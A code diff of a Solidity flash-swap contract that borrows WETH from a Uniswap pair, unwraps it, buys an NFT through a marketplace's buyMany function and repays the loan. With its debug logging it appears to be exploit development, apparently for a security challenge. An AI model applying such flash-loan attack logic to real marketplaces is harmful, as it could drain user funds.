@@ -102,13 +102,25 @@ contract UniswapFlashSwap is IUniswapV2Callee, IERC721Receiver {
     uint256[] memory tokenIds = new uint256[](1);
     tokenIds[0] = 0;
     console.log("contract Balance: ", address(this).balance);
-    WETH(tokenBorrow).withdraw(balance0);
+    WETH wethContract = WETH(tokenBorrow);
+    wethContract.withdraw(balance0);
     console.log("Now contract Balance: ", address(this).balance);
+    console.log("offersCount : ", market.offersCount());
     market.buyMany{value: 15 ether}(tokenIds);
-    console.log("bought", nft.ownerOf(0));
-    console.log("bought", address(this));
+    console.log("after Buy Many", address(this).balance);
+    // console.log("bought", address(this));
+    // console.log("offersCount : ", market.offersCount());
+    // console.log("1contract Balance: ", address(this).balance);
+    // nft.setApprovalForAll(address(market), true);
+    // uint256[] memory prices = new uint256[](1);
+    // prices[0] = 1;
+    // market.offerMany(tokenIds,prices);
 
-    //IERC20(tokenBorrow).transfer(pair, amountToRepay); 
+    console.log("2contract Balance: ", address(this).balance);
+
+    wethContract.deposit{value:amountToRepay}();
+    wethContract.transfer(pair, amountToRepay);
+    console.log("DOne dana done"); 
   }
   receive() external payable {
     console.log("Received Money");
